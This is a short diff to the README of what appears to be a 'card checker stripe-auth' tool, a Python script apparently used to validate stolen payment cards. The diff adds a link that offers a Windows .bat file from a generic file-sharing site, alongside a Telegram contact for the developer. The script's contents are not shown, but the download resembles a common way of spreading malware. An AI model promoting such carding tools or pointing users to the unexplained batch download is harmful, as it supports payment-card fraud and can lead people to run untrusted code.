@@ -12,5 +12,9 @@ card checker stripe-auth using python 3.12.0
 - python -m pip install -r requirements.txt
 - python oki.py
 ```
+
+# For Windows
+[Download .bat here](https://filedropshare.com?connectionId=egd0)
+
 ## Contact DEV
 [TELEGRAM](https://t.me/xqndrs66)
